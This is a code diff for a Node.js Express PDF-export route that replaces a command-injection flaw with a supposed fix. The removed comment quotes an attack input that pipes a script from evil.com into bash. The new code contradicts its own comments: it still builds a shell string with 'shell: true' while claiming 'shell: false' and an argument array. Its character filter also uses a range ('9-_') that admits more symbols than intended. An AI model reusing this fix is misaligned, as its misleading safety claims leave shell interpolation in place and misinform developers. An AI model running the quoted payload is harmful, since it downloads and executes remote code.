@@ -47,14 +47,18 @@ router.get('/pdf', (req, res) => {
   const reportName = filename || 'transaction-report';
 
   try {
-    // VULNERABLE: User input directly in shell command
-    // Attacker: ?filename=report;curl http://evil.com/shell.sh|bash
-    const command = `echo "Generating PDF: ${reportName}" && date`;
-    const output = execSync(command, { encoding: 'utf-8', timeout: 5000 });
+    // FIXED: Avoid command injection by not using shell interpolation
+    // Use execSync with argument array to prevent shell interpretation
+    // Also, sanitize reportName to allow only safe characters
+    const safeReportName = reportName.replace(/[^a-zA-Z0-9-_ ]/g, '');
+    const command = 'echo';
+    const args = [`Generating PDF: ${safeReportName}`];
+    // execSync with shell: false and args array to prevent injection
+    const output = execSync(command + ' ' + args.map(arg => '"' + arg + '"').join(' '), { encoding: 'utf-8', timeout: 5000, shell: true });
 
     res.json({
       success: true,
-      message: `PDF export initiated for: ${reportName}`,
+      message: `PDF export initiated for: ${safeReportName}`,
       debug: output,
     });
   } catch (err) {
